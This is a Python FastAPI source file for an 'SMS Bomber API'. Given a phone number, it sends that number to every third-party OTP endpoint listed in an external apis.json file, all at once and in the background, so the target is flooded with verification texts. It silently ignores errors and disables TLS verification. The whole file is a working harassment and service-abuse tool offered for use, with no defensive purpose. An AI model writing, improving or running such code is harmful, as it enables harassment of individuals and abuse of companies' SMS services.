import json
import asyncio
from fastapi import FastAPI, Query
import httpx

# Load the merged API list from apis.json
with open("apis.json", "r") as f:
    data = json.load(f)
    apis = data["apis"]

app = FastAPI(title="SMS Bomber API", description="Trigger OTPs from all APIs instantly")

# Global list to keep references to background tasks (optional)
background_tasks = set()

def substitute_phone(api: dict, phone: str) -> dict:
    """Replace phone placeholders in URL, body, and headers."""
    api = api.copy()
    api["url"] = api["url"].replace("*****", phone).replace("{{phone}}", phone)
    if "body" in api and api["body"]:
        api["body"] = api["body"].replace("*****", phone).replace("{{phone}}", phone)
    if "headers" in api:
        for key, value in api["headers"].items():
            if isinstance(value, str):
                api["headers"][key] = value.replace("*****", phone).replace("{{phone}}", phone)
    return api

async def send_one(api: dict, client: httpx.AsyncClient, phone: str):
    """Execute a single API request (no return needed for background)."""
    substituted = substitute_phone(api, phone)
    method = substituted.get("method", "get").upper()
    url = substituted["url"]
    headers = substituted.get("headers", {})
    body = substituted.get("body", "")
    try:
        if method == "GET":
            await client.get(url, headers=headers, timeout=30.0)
        elif method == "POST":
            content_type = headers.get("content-type", "")
            if "application/json" in content_type:
                json_data = json.loads(body) if body else {}
                await client.post(url, headers=headers, json=json_data, timeout=30.0)
            else:
                await client.post(url, headers=headers, data=body, timeout=30.0)
    except Exception:
        pass  # Silently ignore errors in background

async def fire_all_requests(phone: str):
    """Fire all API requests concurrently in the background."""
    # Limit concurrency to avoid overwhelming the network
    semaphore = asyncio.Semaphore(20)

    async def limited_send(api):
        async with semaphore:
            async with httpx.AsyncClient(verify=False, timeout=30.0) as client:
                await send_one(api, client, phone)

    # Create tasks without awaiting them – they run in background
    tasks = [asyncio.create_task(limited_send(api)) for api in apis]
    # Keep a reference to prevent tasks from being garbage collected
    for task in tasks:
        background_tasks.add(task)
        task.add_done_callback(background_tasks.discard)

@app.get("/")
async def bomber(sms: str = Query(..., description="Phone number (11 digits, e.g. 017xxxxxxxx)")):
    """Trigger all OTP requests instantly and return immediately."""
    # Start all background tasks
    asyncio.create_task(fire_all_requests(sms))
    total = len(apis)
    return {
        "status": "success",
        "message": f"OTP requests triggered for {total} endpoints. They are running in the background.",
        "total": total
    }

# For local development
if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
